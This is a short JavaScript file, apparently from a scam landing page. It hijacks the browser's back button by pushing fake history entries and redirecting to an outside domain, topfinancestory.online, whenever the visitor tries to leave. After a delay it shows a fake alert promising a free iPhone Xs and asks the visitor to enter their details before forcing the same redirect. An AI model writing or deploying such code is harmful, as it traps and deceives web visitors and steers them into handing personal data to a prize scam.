function getURLParameter(name) {
  return decodeURI(
    (RegExp(name + "=" + "(.+?)(&|$)").exec(location.search) || [, null])[1] ||
      ""
  );
}
!(function () {
  var t;
  try {
    for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
    onpopstate = function (t) {
      t.state &&
        location.replace("http://topfinancestory.online?_lp=1&_token=");
    };
  } catch (o) {}
})();
function hidemodal01() {
  if (vibr > 0) navigator.vibrate(70);
  var modal1 = document.getElementById("modal01").classList.remove("visible");
  var so = (document.querySelector(".sweet-overlay").style.display = "none");
}
if ("vibrate" in navigator) {
  var vibr = 1;
} else {
  var vibr = 0;
  var str1;
  str1 = "http://topfinancestory.online?_lp=1&_token=";
  setTimeout(function () {
    alert(
      "You have the chance to get your iPhone Xs!\n\n1. Press OK to claim your iPhone Xs. You will be redirected to our partner’s site.\n\n2. Enter your details to get information on how to receive your prize.\n\n***Hurry, this offer is limited***"
    );
    PreventExitPop = false;
    window.location = str1;
  }, 180000);
}
